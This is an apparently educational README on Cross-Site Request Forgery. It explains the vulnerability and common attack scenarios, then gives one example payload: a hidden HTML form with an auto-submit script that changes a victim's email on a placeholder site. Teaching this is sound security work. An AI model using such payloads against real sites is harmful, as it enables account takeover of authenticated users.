# Cross-Site Request Forgery (CSRF)

This repository is dedicated to exploring Cross-Site Request Forgery (CSRF) vulnerabilities, providing examples of common CSRF attacks and payloads, and offering strategies for prevention. This learning path is inspired by content from [web-security-academy.net](https://portswigger.net/web-security) and Rana Khalil (https://ranakhalil.com/), it aims to enhance your understanding of CSRF.

## Introduction to CSRF

Cross-Site Request Forgery (CSRF) is a security vulnerability that allows an attacker to trick a user into performing actions on a web application where they are authenticated. By leveraging the user's authenticated session, the attacker can execute unwanted actions such as changing user details, making transactions, or altering security settings.

## Common CSRF Attack Scenarios

1. **Changing User Account Details**: An attacker tricks the victim into changing their email address or password.
2. **Making Unauthorized Transactions**: An attacker initiates money transfers or purchases using the victim's session.
3. **Changing Security Settings**: An attacker alters security settings, such as enabling or disabling two-factor authentication.
4. **Posting or Deleting Content**: An attacker posts unwanted content or deletes important data on behalf of the victim.

## Example Payloads

### Changing Email Address

```html
<!-- Malicious HTML Form -->
<form action="https://vulnerable-website.com/update-email" method="POST">
    <input type="hidden" name="email" value="attacker@example.com" />
    <input type="submit" value="Submit" />
</form>

<!-- JavaScript to Auto-Submit the Form -->
<script>
    document.forms[0].submit();
</script>
```
